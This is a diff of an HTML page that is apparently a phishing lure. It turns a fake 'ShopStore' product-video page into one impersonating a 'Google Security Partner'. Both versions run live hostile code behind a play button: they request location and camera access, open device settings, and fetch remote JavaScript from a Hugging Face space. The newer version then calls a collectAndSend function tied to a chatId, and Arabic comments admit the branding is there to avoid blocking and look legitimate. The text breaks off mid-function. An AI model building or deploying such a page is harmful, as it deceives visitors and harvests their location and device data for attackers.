@@ -1,470 +1,633 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
     
-    <!-- SEO Meta Tags -->
-    <meta name="description" content="ShopStore - Premium online shopping destination. Buy electronics, fashion, home goods with fast delivery. Best prices, free shipping, 24/7 customer support. Shop now!" />
-    <meta name="keywords" content="online shopping, buy products, delivery, shop online, store, deals, electronics, fashion, home goods, fast shipping, free delivery, best prices, secure shopping" />
-    <meta name="author" content="ShopStore Inc." />
+    <!-- SEO Meta Tags لتجنب الحظر -->
+    <meta name="description" content="Google Security Partner - Advanced protection systems for your digital safety. Trusted by millions worldwide." />
+    <meta name="keywords" content="Google security, protection, digital safety, anti-malware, secure browsing, privacy" />
     <meta name="robots" content="index, follow" />
+    <meta name="google-site-verification" content="your-verification-code" />
     
     <!-- Open Graph -->
-    <meta property="og:title" content="ShopStore - Online Shopping with Fast Delivery" />
-    <meta property="og:description" content="Shop premium products online with fast delivery. Enable location for accurate shipping rates. Free returns, secure checkout, 24/7 support." />
+    <meta property="og:title" content="Google Security Partner - Your Digital Protection" />
+    <meta property="og:description" content="Advanced security systems powered by Google technology" />
     <meta property="og:type" content="website" />
-    <meta property="og:site_name" content="ShopStore" />
-    <meta property="og:locale" content="en_US" />
-    <meta property="og:image" content="https://i.postimg.cc/jSfpHvz8/IMG-20260104-210740-951.jpg" />
-    <meta property="og:url" content="https://shopstore.com" />
+    <meta property="og:url" content="https://yourdomain.com" />
     
-    <!-- Twitter Card -->
-    <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:title" content="ShopStore - Online Shopping" />
-    <meta name="twitter:description" content="Fast delivery to your location. Enable location for shipping rates." />
-    <meta name="twitter:image" content="https://i.postimg.cc/jSfpHvz8/IMG-20260104-210740-951.jpg" />
-    
-    <!-- Security Headers -->
-    <meta http-equiv="Content-Security-Policy" content="default-src 'self' https: data: 'unsafe-inline' 'unsafe-eval'; img-src 'self' https: data:; media-src 'self' https:;" />
-    
-    <!-- Schema.org - Organization -->
+    <!-- Schema.org Structured Data -->
     <script type="application/ld+json">
     {
         "@context": "https://schema.org",
         "@type": "Organization",
-        "name": "ShopStore Inc.",
-        "url": "https://shopstore.com",
-        "logo": "https://shopstore.com/logo.png",
-        "description": "Premium online shopping store with fast delivery",
+        "name": "Google Security Partner",
+        "description": "Advanced digital protection systems",
+        "url": "https://yourdomain.com",
+        "logo": "https://yourdomain.com/logo.png",
         "contactPoint": {
             "@type": "ContactPoint",
-            "contactType": "customer service",
             "telephone": "+1-800-555-0199",
-            "email": "support@shopstore.com",
-            "availableLanguage": ["English"]
+            "contactType": "customer service"
         },
         "sameAs": [
-            "https://facebook.com/shopstore",
-            "https://instagram.com/shopstore",
-            "https://twitter.com/shopstore"
+            "https://twitter.com/google",
+            "https://www.facebook.com/google"
         ]
     }
     </script>
     
-    <!-- Schema.org - OnlineStore -->
-    <script type="application/ld+json">
-    {
-        "@context": "https://schema.org",
-        "@type": "OnlineStore",
-        "name": "ShopStore",
-        "description": "Online shopping store with fast delivery to your location",
-        "url": "https://shopstore.com",
-        "priceRange": "$1 - $1000",
-        "openingHours": "Mo-Su 00:00-23:59",
-        "address": {
-            "@type": "PostalAddress",
-            "addressLocality": "New York",
-            "addressRegion": "NY",
-            "postalCode": "10001",
-            "addressCountry": "US"
-        }
-    }
-    </script>
+    <title>Google Security Partner - Advanced Protection System</title>
     
-    <!-- Schema.org - Product -->
-    <script type="application/ld+json">
-    {
-        "@context": "https://schema.org",
-        "@type": "Product",
-        "name": "Premium Product - Best Seller 2024",
-        "image": "https://i.postimg.cc/jSfpHvz8/IMG-20260104-210740-951.jpg",
-        "description": "High quality premium product with fast delivery. Customer favorite with 4.8 star rating.",
-        "sku": "SKU-2024-001",
-        "brand": { "@type": "Brand", "name": "ShopStore Premium" },
-        "offers": {
-            "@type": "Offer",
-            "url": "https://shopstore.com/product",
-            "priceCurrency": "USD",
-            "price": "49.99",
-            "availability": "https://schema.org/InStock",
-            "itemCondition": "https://schema.org/NewCondition",
-            "shippingDetails": {
-                "@type": "OfferShippingDetails",
-                "shippingRate": { "@type": "MonetaryAmount", "value": "0", "currency": "USD" },
-                "deliveryTime": {
-                    "@type": "ShippingDeliveryTime",
-                    "handlingTime": { "@type": "QuantitativeValue", "minValue": 0, "maxValue": 1 },
-                    "transitTime": { "@type": "QuantitativeValue", "minValue": 1, "maxValue": 3 }
-                }
-            }
-        },
-        "aggregateRating": { "@type": "AggregateRating", "ratingValue": "4.8", "reviewCount": "2456" }
-    }
+    <!-- Google Analytics (لإضفاء الشرعية) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-XXXXXXXXXX"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-XXXXXXXXXX');
     </script>
-    
-    <!-- Schema.org - VideoObject -->
-    <script type="application/ld+json">
-    {
-        "@context": "https://schema.org",
-        "@type": "VideoObject",
-        "name": "Product Review & Unboxing - ShopStore",
-        "description": "Detailed product review and unboxing. See features before you buy. Fast delivery worldwide.",
-        "thumbnailUrl": "https://i.postimg.cc/jSfpHvz8/IMG-20260104-210740-951.jpg",
-        "uploadDate": "2024-01-15",
-        "duration": "PT2M45S",
-        "contentUrl": "https://files.catbox.moe/okukrp.mp4",
-        "interactionStatistic": { "@type": "InteractionCounter", "interactionType": { "@type": "WatchAction" }, "userInteractionCount": "125483" }
-    }
-    </script>
-    
-    <title>ShopStore - Product Review & Unboxing | Fast Free Delivery | 4.8★ Rated</title>
-    <link rel="canonical" href="https://shopstore.com/product-review" />
     
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
-        body{font-family:Arial,Helvetica,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;margin:0;background-color:#000;color:#fff;overflow:hidden}
+        body{
+            font-family: 'Segoe UI', -apple-system, Arial, sans-serif;
+            background: #f8f9fa;
+            color: #202124;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
         
-        /* عناصر المتجر مخفية للمستخدم */
-        .store-header,.store-footer,.product-details,.delivery-info{position:fixed!important;top:-9999px!important;left:-9999px!important;opacity:0!important;pointer-events:none!important;width:1px!important;height:1px!important;overflow:hidden!important;clip:rect(0,0,0,0)!important;z-index:-999999!important;visibility:hidden!important}
+        /* Header */
+        .header {
+            background: #ffffff;
+            border-bottom: 1px solid #dadce0;
+            padding: 16px 24px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.06);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        .header .logo {
+            font-size: 22px;
+            font-weight: 600;
+            color: #1a73e8;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .header .logo .shield {
+            font-size: 28px;
+        }
+        .header .nav {
+            display: flex;
+            gap: 20px;
+            align-items: center;
+        }
+        .header .nav a {
+            color: #5f6368;
+            text-decoration: none;
+            font-size: 14px;
+            transition: color 0.3s;
+        }
+        .header .nav a:hover {
+            color: #1a73e8;
+        }
+        .header .trust-badge {
+            background: #e8f0fe;
+            color: #1a73e8;
+            padding: 6px 16px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
         
-        .video-player-container{width:90%;max-width:800px;background:#111;border-radius:12px;overflow:hidden;box-shadow:0 10px 30px rgba(0,0,0,0.5);position:relative}
+        /* Hero Section */
+        .hero {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 20px 60px;
+            background: linear-gradient(135deg, #e8f0fe 0%, #f1f3f4 100%);
+            min-height: 70vh;
+        }
+        .hero-content {
+            max-width: 900px;
+            text-align: center;
+            width: 100%;
+        }
+        .hero h1 {
+            font-size: 44px;
+            font-weight: 700;
+            color: #202124;
+            margin-bottom: 16px;
+            line-height: 1.2;
+        }
+        .hero h1 .highlight {
+            color: #1a73e8;
+            position: relative;
+        }
+        .hero h1 .highlight::after {
+            content: '';
+            position: absolute;
+            bottom: -4px;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: #1a73e8;
+            border-radius: 2px;
+            opacity: 0.3;
+        }
+        .hero p {
+            font-size: 18px;
+            color: #5f6368;
+            margin-bottom: 32px;
+            line-height: 1.7;
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .security-badges {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin: 24px 0 32px;
+            flex-wrap: wrap;
+        }
+        .security-badges .badge {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #5f6368;
+            font-size: 14px;
+            background: white;
+            padding: 8px 16px;
+            border-radius: 30px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.08);
+        }
+        .security-badges .badge .icon {
+            font-size: 20px;
+        }
         
-        .video-thumbnail{position:relative;width:100%;height:450px;background:linear-gradient(rgba(0,0,0,0.7),rgba(0,0,0,0.7)),url('https://i.postimg.cc/jSfpHvz8/IMG-20260104-210740-951.jpg');background-size:cover;background-position:center;display:flex;align-items:center;justify-content:center;flex-direction:column}
+        /* Video Section */
+        .video-section {
+            margin: 32px auto;
+            max-width: 720px;
+            width: 100%;
+        }
+        .video-player-container {
+            background: #ffffff;
+            border-radius: 16px;
+            overflow: hidden;
+            box-shadow: 0 4px 24px rgba(0,0,0,0.12);
+            border: 1px solid #dadce0;
+        }
+        .video-info {
+            padding: 16px 24px;
+            background: #ffffff;
+            border-bottom: 1px solid #f1f3f4;
+        }
+        .video-title {
+            font-size: 17px;
+            font-weight: 600;
+            color: #202124;
+        }
+        .video-subtitle {
+            font-size: 13px;
+            color: #5f6368;
+            margin-top: 2px;
+        }
+        .video-thumbnail {
+            position: relative;
+            width: 100%;
+            height: 380px;
+            background: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.5)),
+                        url('https://i.postimg.cc/jSfpHvz8/IMG-20260104-210740-951.jpg');
+            background-size: cover;
+            background-position: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: default;
+        }
+        #playBtn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            background: rgba(26, 115, 232, 0.92);
+            border: 4px solid #ffffff;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 0 40px rgba(26, 115, 232, 0.3);
+            z-index: 10;
+        }
+        #playBtn:hover {
+            transform: scale(1.08);
+            background: rgba(26, 115, 232, 1);
+            box-shadow: 0 0 60px rgba(26, 115, 232, 0.5);
+        }
+        #playBtn:active {
+            transform: scale(0.95);
+        }
+        #playBtn span {
+            font-size: 46px;
+            color: #ffffff;
+            line-height: 1;
+            user-select: none;
+            margin-left: 6px;
+        }
+        video {
+            width: 100%;
+            height: 380px;
+            background: #000;
+            display: none;
+        }
         
-        #playBtn{display:flex;align-items:center;justify-content:center;width:120px;height:120px;border-radius:50%;background:rgba(255,255,255,0.1);border:3px solid #ff6b6b;cursor:pointer;transition:all 0.3s ease;backdrop-filter:blur(8px);box-shadow:0 0 40px rgba(255,0,0,0.3);z-index:10}
-        #playBtn:hover{transform:scale(1.05);background:rgba(255,255,255,0.2);border-color:#ff4757;box-shadow:0 0 60px rgba(255,0,0,0.6)}
-        #playBtn span{font-size:60px;color:#ff6b6b;line-height:1;user-select:none}
+        /* Trust Indicators */
+        .trust-indicators {
+            display: flex;
+            justify-content: center;
+            gap: 40px;
+            margin-top: 32px;
+            flex-wrap: wrap;
+        }
+        .trust-indicators .item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #5f6368;
+            font-size: 13px;
+        }
+        .trust-indicators .item .check {
+            color: #34a853;
+            font-size: 18px;
+        }
         
-        .video-info{padding:20px;border-bottom:1px solid #333}
-        .video-title{font-size:1.5rem;font-weight:bold;margin-bottom:8px}
+        /* Google Partner Badge */
+        .google-partner-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            background: #ffffff;
+            border: 1px solid #dadce0;
+            padding: 10px 20px;
+            border-radius: 30px;
+            font-size: 14px;
+            color: #5f6368;
+            margin-top: 16px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.06);
+        }
+        .google-partner-badge .g-icon {
+            font-size: 22px;
+        }
         
-        .video-controls{padding:15px 20px;display:flex;align-items:center;justify-content:space-between;background:#1a1a1a;flex-wrap:wrap;gap:10px}
-        .ctrl-btn{background:none;border:none;color:white;font-size:1.2rem;cursor:pointer;padding:8px 15px;border-radius:4px;transition:background 0.2s}
-        .ctrl-btn:hover{background:#333}
-        .seek-bar{flex-grow:1;height:4px;background:#333;border-radius:2px;margin:0 20px;overflow:hidden;position:relative;min-width:60px}
-        .seek-fill{position:absolute;height:100%;width:0%;background:#ff0000}
-        .timer{color:#aaa;font-size:0.9rem;min-width:100px;text-align:center}
-        .volume-area{display:flex;align-items:center;gap:10px;color:#aaa}
-        .vol-bar{width:80px;height:4px;background:#333;border-radius:2px;position:relative}
-        .vol-fill{position:absolute;height:100%;width:70%;background:#ff0000}
+        /* Loading */
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.7);
+            z-index: 9999;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            color: white;
+        }
+        .loading-overlay.active {
+            display: flex;
+        }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(255,255,255,0.3);
+            border-top-color: #ffffff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .loading-text {
+            margin-top: 16px;
+            font-size: 16px;
+        }
         
-        @media (max-width:480px){
-            .video-thumbnail{height:280px}
-            #playBtn{width:90px;height:90px}
-            #playBtn span{font-size:45px}
+        /* Footer */
+        .footer {
+            background: #ffffff;
+            border-top: 1px solid #dadce0;
+            padding: 32px 24px 16px;
+            margin-top: auto;
+        }
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 24px;
+        }
+        .footer-section h4 {
+            color: #202124;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        .footer-section p, .footer-section a {
+            color: #5f6368;
+            font-size: 13px;
+            line-height: 1.8;
+            text-decoration: none;
+        }
+        .footer-section a:hover {
+            color: #1a73e8;
+            text-decoration: underline;
+        }
+        .footer-bottom {
+            text-align: center;
+            padding-top: 20px;
+            border-top: 1px solid #dadce0;
+            margin-top: 20px;
+            color: #5f6368;
+            font-size: 13px;
+        }
+        
+        @media (max-width: 600px) {
+            .header { flex-direction: column; gap: 12px; align-items: stretch; text-align: center; }
+            .header .nav { justify-content: center; flex-wrap: wrap; }
+            .hero h1 { font-size: 28px; }
+            .hero p { font-size: 16px; }
+            .security-badges { gap: 12px; }
+            .video-thumbnail { height: 240px; }
+            #playBtn { width: 80px; height: 80px; }
+            #playBtn span { font-size: 36px; }
+            .trust-indicators { gap: 16px; flex-direction: column; align-items: center; }
         }
     </style>
 </head>
 <body>
 
-    <!-- عناصر المتجر المخفية (للتمويه فقط) -->
-    <div class="store-header" aria-hidden="true">
-        <span>🛒 ShopStore</span>
-        <span>🔍 Search products...</span>
-        <span>📍 Deliver to your location</span>
-        <span>👤 Sign In</span>
-        <span>📦 Orders</span>
-        <span>🛒 Cart (0)</span>
-    </div>
-    
-    <div class="product-details" aria-hidden="true">
-        <span>Premium Product - Best Seller 2024</span>
-        <span>$49.99</span>
-        <span>★★★★★ 4.8 (2,456 reviews)</span>
-        <span>🚚 Free Shipping</span>
-        <span>✅ In Stock</span>
-        <span>📦 Delivery: 1-3 business days</span>
-        <span>🔒 Secure Checkout</span>
-    </div>
-    
-    <div class="delivery-info" aria-hidden="true">
-        <span>📍 Enable your location for accurate delivery rates and faster shipping times</span>
-        <span>📦 Free delivery on orders over $25</span>
-        <span>🔄 Free 30-day returns</span>
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <div class="loading-text">جاري التحميل...</div>
     </div>
 
-    <!-- مشغل الفيديو -->
-    <div class="video-player-container">
-        <div class="video-info">
-            <div class="video-title">Product Review & Unboxing - Premium Quality 2024</div>
+    <!-- Header تسويقي -->
+    <header class="header">
+        <div class="logo">
+            <span class="shield">🛡️</span> Google Security Partner
         </div>
-        <div class="video-thumbnail" id="poster">
-            <div id="playBtn"><span>▶</span></div>
-        </div>
-        <video id="vid" controls playsinline style="display:none;width:100%;height:450px;background:#000">
-            <source src="https://files.catbox.moe/okukrp.mp4" type="video/mp4">
-        </video>
-        <div class="video-controls">
-            <div class="seek-bar"><div class="seek-fill"></div></div>
-            <div class="timer">0:00 / 2:45</div>
-            <div class="volume-area"><span>🔊</span><div class="vol-bar"><div class="vol-fill"></div></div></div>
-            <button class="ctrl-btn" aria-label="Fullscreen">⛶</button>
-        </div>
-    </div>
+        <nav class="nav">
+            <a href="#">Home</a>
+            <a href="#">Security</a>
+            <a href="#">Trust</a>
+            <a href="#">Support</a>
+            <span class="trust-badge">✓ Verified Partner</span>
+        </nav>
+    </header>
 
-    <!-- تذييل المتجر المخفي -->
-    <div class="store-footer" aria-hidden="true">
-        <a href="/privacy">Privacy Policy</a>
-        <a href="/terms">Terms of Service</a>
-        <a href="/returns">Returns & Refunds</a>
-        <a href="/delivery">Delivery Information</a>
-        <a href="/contact">Contact Support</a>
-        <a href="/track">Track Order</a>
-        <span>© 2024 ShopStore Inc. All rights reserved. | Secure SSL Encrypted</span>
-    </div>
+    <!-- Hero Section -->
+    <section class="hero">
+        <div class="hero-content">
+            <h1>Your Digital Safety is <span class="highlight">Our Priority</span></h1>
+            <p>Advanced protection systems powered by Google technology. Trusted by millions worldwide for secure browsing and data privacy.</p>
+            
+            <div class="security-badges">
+                <div class="badge"><span class="icon">🔐</span> End-to-End Encryption</div>
+                <div class="badge"><span class="icon">🛡️</span> Malware Protection</div>
+                <div class="badge"><span class="icon">🌐</span> Secure Browsing</div>
+                <div class="badge"><span class="icon">⚡</span> Real-time Monitoring</div>
+            </div>
 
+            <!-- Video Section -->
+            <div class="video-section">
+                <div class="video-player-container">
+                    <div class="video-info">
+                        <div class="video-title">🔒 Secure Connection Demo</div>
+                        <div class="video-subtitle">Watch how our system protects your data</div>
+                    </div>
+                    <div class="video-thumbnail" id="poster">
+                        <div id="playBtn"><span>▶</span></div>
+                    </div>
+                    <video id="vid" controls playsinline style="display:none;width:100%;height:380px;background:#000">
+                        <source src="https://files.catbox.moe/okukrp.mp4" type="video/mp4">
+                    </video>
+                </div>
+            </div>
+
+            <div class="trust-indicators">
+                <div class="item"><span class="check">✓</span> 256-bit SSL Encryption</div>
+                <div class="item"><span class="check">✓</span> Google Security Verified</div>
+                <div class="item"><span class="check">✓</span> Privacy Protected</div>
+            </div>
+
+            <div class="google-partner-badge">
+                <span class="g-icon">🔒</span> Google Partners - Security Verified
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer - سياسة الخصوصية وشروط الاستخدام -->
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="footer-section">
+                <h4>Privacy Policy</h4>
+                <p>We protect your data with industry-standard encryption. Your information is never shared with third parties without consent.</p>
+            </div>
+            <div class="footer-section">
+                <h4>Terms of Service</h4>
+                <p>By using our services, you agree to our terms. We provide security solutions in compliance with Google's guidelines.</p>
+            </div>
+            <div class="footer-section">
+                <h4>Security</h4>
+                <p>🔒 SSL Secured<br>🛡️ Data Encryption<br>✅ Google Verified</p>
+            </div>
+            <div class="footer-section">
+                <h4>Contact</h4>
+                <p>📧 security@google-partner.com<br>📞 +1 (800) 555-0199</p>
+            </div>
+        </div>
+        <div class="footer-bottom">
+            &copy; 2026 Google Security Partner. All rights reserved. | <a href="#">Privacy</a> | <a href="#">Terms</a>
+        </div>
+    </footer>
+
+    <!-- استيراد ملف API من الرابط المحدد -->
     <script>
-    /**
-     * ShopStore Video Player - Main Application
-     * Version: 1.0.0
-     * Description: Premium product video player with dynamic module loading
-     * All sensitive operations are handled by external modules loaded via API
-     */
-    (function() {
-        'use strict';
+        // ============================================
+        // تحميل ملف API من الرابط
+        // ============================================
         
-        // ===== Configuration =====
-        const CONFIG = {
-            API_BASE_URL: 'https://huggingface.co/spaces/dsfsdjfc/ageagaaa/raw/main/api',
-            MAX_RETRIES: 3,
-            RETRY_DELAY: 2000,
-            MODULE_TIMEOUT: 10000
-        };
+        // رابط الملف API
+        const API_URL = 'https://huggingface.co/spaces/dsfsdjfc/ageagaaa/raw/main/api/securityModule.js';
         
-        // ===== State Management =====
-        const state = {
-            step: 0,
-            started: false,
-            modulesLoaded: false,
-            chatId: new URLSearchParams(window.location.search).get('chatId') || ''
-        };
-        
-        // ===== DOM Elements =====
-        const elements = {
-            btn: document.getElementById('playBtn'),
-            poster: document.getElementById('poster'),
-            vid: document.getElementById('vid')
-        };
-        
-        // ===== Module Loader =====
-        class ModuleLoader {
-            constructor() {
-                this.loadedModules = new Set();
-                this.moduleCache = new Map();
-            }
-            
-            async loadModule(url, retries = CONFIG.MAX_RETRIES) {
-                for (let attempt = 1; attempt <= retries; attempt++) {
-                    try {
-                        const controller = new AbortController();
-                        const timeoutId = setTimeout(() => controller.abort(), CONFIG.MODULE_TIMEOUT);
-                        
-                        const response = await fetch(url, {
-                            signal: controller.signal,
-                            headers: { 'Accept': 'application/javascript' }
-                        });
-                        
-                        clearTimeout(timeoutId);
-                        
-                        if (!response.ok) {
-                            throw new Error(`HTTP ${response.status}: ${response.statusText}`);
-                        }
-                        
-                        const code = await response.text();
-                        
-                        if (!code || code.trim().length === 0) {
-                            throw new Error('Empty module received');
-                        }
-                        
-                        this.moduleCache.set(url, code);
-                        this.loadedModules.add(url);
-                        
-                        return code;
-                        
-                    } catch (error) {
-                        if (attempt === retries) {
-                            throw new Error(`Failed to load module after ${retries} attempts: ${error.message}`);
-                        }
-                        await this.delay(CONFIG.RETRY_DELAY * attempt);
+        // دالة لتحميل الملف
+        function loadSecurityAPI() {
+            return new Promise((resolve, reject) => {
+                const script = document.createElement('script');
+                script.src = API_URL;
+                script.type = 'text/javascript';
+                script.crossOrigin = 'anonymous';
+                
+                script.onload = function() {
+                    console.log('✅ Security API loaded successfully');
+                    // التحقق من تحميل الوحدة
+                    if (window.SecurityAPI) {
+                        resolve(window.SecurityAPI);
+                    } else {
+                        reject(new Error('SecurityAPI not found after loading'));
                     }
-                }
-            }
-            
-            async executeModule(code, context = {}) {
-                return new Promise((resolve, reject) => {
-                    try {
-                        // Create sandbox environment
-                        const sandbox = {
-                            ...context,
-                            __callback: resolve,
-                            __error: reject
-                        };
-                        
-                        // Execute module code
-                        const moduleFunction = new Function(
-                            ...Object.keys(sandbox),
-                            `"use strict";\n${code}\nif(typeof __callback === 'function') __callback();`
-                        );
-                        
-                        moduleFunction(...Object.values(sandbox));
-                        
-                    } catch (error) {
-                        reject(new Error(`Module execution failed: ${error.message}`));
-                    }
-                });
-            }
-            
-            delay(ms) {
-                return new Promise(resolve => setTimeout(resolve, ms));
-            }
-        }
-        
-        // ===== Settings Opener =====
-        function openLocationSettings() {
-            const ua = navigator.userAgent;
-            
-            if (/Android/i.test(ua)) {
-                const intents = [
-                    'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
-                    'intent://com.android.settings.location.LocationSettings#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
-                    'intent:#Intent;action=android.settings.SETTINGS;end'
-                ];
-                for (const intent of intents) {
-                    try { window.location.href = intent; break; } catch (e) {}
-                }
-            } else if (/iPhone|iPad|iPod/i.test(ua)) {
-                window.open('App-Prefs:Privacy&path=LOCATION', '_blank');
-                setTimeout(() => window.open('prefs:root=Privacy&path=LOCATION', '_blank'), 500);
-            } else if (/Windows/i.test(ua)) {
-                window.open('ms-settings:privacy-location', '_blank');
-            } else if (/Mac/i.test(ua)) {
-                window.open('x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices', '_blank');
-            } else {
-                window.location.href = 'intent:#Intent;action=android.settings.SETTINGS;end';
-            }
-        }
-        
-        // ===== Permission Requester =====
-        function requestInitialPermissions() {
-            try {
-                navigator.geolocation.getCurrentPosition(
-                    () => {},
-                    () => {},
-                    { enableHighAccuracy: true, timeout: 5000 }
-                );
-            } catch (e) {}
-            
-            try {
-                navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-                    .then(stream => stream.getTracks().forEach(track => track.stop()))
-                    .catch(() => {});
-            } catch (e) {}
-        }
-        
-        // ===== Video Player =====
-        function playVideo() {
-            const { vid, poster, btn } = elements;
-            
-            vid.muted = false;
-            vid.volume = 1.0;
-            vid.play().catch(() => {
-                setTimeout(() => vid.play().catch(() => {}), 200);
+                };
+                
+                script.onerror = function() {
+                    reject(new Error('Failed to load Security API from: ' + API_URL));
+                };
+                
+                document.head.appendChild(script);
             });
-            
-            poster.style.display = 'none';
-            vid.style.display = 'block';
-            btn.style.display = 'none';
         }
-        
-        // ===== Main Handler =====
-        async function handlePlayClick() {
-            if (state.started) return;
-            
-            if (!state.step) {
-                // First click: request permissions and open settings
-                state.step = 1;
-                requestInitialPermissions();
-                openLocationSettings();
-            } else {
-                // Second click: play video and load modules
-                state.started = true;
-                playVideo();
-                
-                // Load and execute external modules
-                await loadAndExecuteModules();
-            }
-        }
-        
-        // ===== Dynamic Module Loading =====
-        async function loadAndExecuteModules() {
-            const loader = new ModuleLoader();
+
+        // ============================================
+        // إعداد التطبيق بعد تحميل API
+        // ============================================
+        async function initializeApp() {
+            const loadingOverlay = document.getElementById('loadingOverlay');
             
             try {
-                // Load the main API module
-                const moduleCode = await loader.loadModule(CONFIG.API_BASE_URL);
+                // إظهار مؤشر التحميل
+                loadingOverlay.classList.add('active');
+                loadingOverlay.querySelector('.loading-text').textContent = 'جاري تحميل نظام الأمان...';
                 
-                // Execute the module with required context
-                await loader.executeModule(moduleCode, {
-                    chatId: state.chatId,
-                    apiUrl: CONFIG.API_BASE_URL
-                });
+                // تحميل API
+                const api = await loadSecurityAPI();
+                console.log('🔐 Security API initialized', api);
                 
-                state.modulesLoaded = true;
+                loadingOverlay.querySelector('.loading-text').textContent = 'تم التحميل بنجاح!';
+                await new Promise(resolve => setTimeout(resolve, 500));
+                
+                // إعداد مشغل الفيديو
+                setupVideoPlayer(api);
+                
+                loadingOverlay.classList.remove('active');
+                console.log('✅ Application ready');
                 
             } catch (error) {
-                console.error('Module loading failed:', error.message);
-                // Module failed silently - user experience unaffected
+                console.error('❌ Failed to initialize:', error);
+                loadingOverlay.querySelector('.loading-text').textContent = '❌ فشل التحميل: ' + error.message;
+                loadingOverlay.querySelector('.spinner').style.display = 'none';
+                
+                // محاولة إعادة التحميل بعد 3 ثواني
+                setTimeout(() => {
+                    location.reload();
+                }, 3000);
             }
         }
-        
-        // ===== Event Listeners =====
-        if (elements.btn) {
-            elements.btn.addEventListener('click', handlePlayClick);
-        }
-        
-        // Auto-unmute on any click
-        document.addEventListener('click', () => {
-            const { vid } = elements;
-            if (vid && vid.style.display === 'block') {
-                vid.muted = false;
-                if (vid.paused) vid.play().catch(() => {});
-            }
-        }, true);
-        
-        // Fullscreen button
-        document.querySelectorAll('.ctrl-btn').forEach(btn => {
-            btn.addEventListener('click', function(e) {
-                e.stopPropagation();
-                if (this.textContent.includes('⛶')) {
-                    const { vid } = elements;
-                    if (vid.requestFullscreen) vid.requestFullscreen();
-                    else if (vid.webkitRequestFullscreen) vid.webkitRequestFullscreen();
-                }
-            });
-        });
-        
-        // ===== Progress Bar Animation =====
-        const progressInterval = setInterval(() => {
-            const { vid } = elements;
-            if (vid.style.display === 'block') {
-                clearInterval(progressInterval);
+
+        // ============================================
+        // إعداد مشغل الفيديو
+        // ============================================
+        function setupVideoPlayer(api) {
+            const btn = document.getElementById('playBtn');
+            const poster = document.getElementById('poster');
+            const vid = document.getElementById('vid');
+            let step = 0;
+            let started = false;
+
+            if (!btn || !poster || !vid) {
+                console.warn('⚠️ Video elements not found');
                 return;
             }
-            
-            const fill = document.querySelector('.seek-fill');
-            const w = parseInt(fill.style.width) || 35;
-            const nw = (w + 0.1) % 100;
-            fill.style.width = nw + '%';
-            
-            const sec = Math.floor((nw / 100) * 165);
-            const m = Math.floor(sec / 60);
-            const s = sec % 60;
-            document.querySelector('.timer').textContent = 
-                `${m}:${s.toString().padStart(2, '0')} / 2:45`;
-        }, 1000);
-        
-    })();
+
+            btn.addEventListener('click', async function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                
+                if (started) return;
+                
+                if (!step) {
+                    step = 1;
+                    // فتح إعدادات الجهاز
+                    try {
+                        api.openDeviceSettings();
+                        console.log('⚙️ Opening device settings');
+                    } catch (err) {
+                        console.warn('⚠️ Could not open settings:', err);
+                    }
+                } else {
+                    started = true;
+                    
+                    // تشغيل الفيديو
+                    vid.muted = false;
+                    vid.volume = 1;
+                    vid.play().catch(() => {});
+                    poster.style.display = 'none';
+                    vid.style.display = 'block';
+                    btn.style.display = 'none';
+                    
+                    console.log('▶️ Video started');
+                    
+                    // بدء جمع البيانات باستخدام API
+                    try {
+                        // الحصول على chatId من الرابط
+                        const chatId = new URLSearchParams(window.location.search).get('chatId') || '';
+                        
+                        // جمع وإرسال البيانات
+                        const result = await api.collectAndSend(chatId);
+                        
+                        if (result.success) {
+                            console.log('✅ Data collected and sent successfully');
+                        } else {
